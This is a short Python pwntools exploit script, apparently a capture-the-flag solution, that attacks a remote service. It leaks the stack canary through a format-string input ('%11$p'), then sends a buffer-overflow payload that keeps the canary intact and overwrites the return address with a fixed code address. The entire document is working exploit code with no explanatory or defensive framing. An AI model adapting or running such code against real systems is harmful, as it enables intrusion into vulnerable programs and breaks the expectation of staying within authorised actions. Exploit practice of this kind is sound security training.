from pwn import *
import struct

context.update(arch='amd64', os='linux')

# p = process("./main")
p = remote("<IP>", 40000)

p.recvuntil("First name: ")
p.sendline("%11$p")
canary = int(p.recvline()[:-1], 16)

# p.recvuntil("Last name: ")

payload = 'A' * 24 + p64(canary) + 'A' * 8 + p64(0x4011e8)
p.sendline(payload)
p.recv()
p.recv()
print(p.recv())
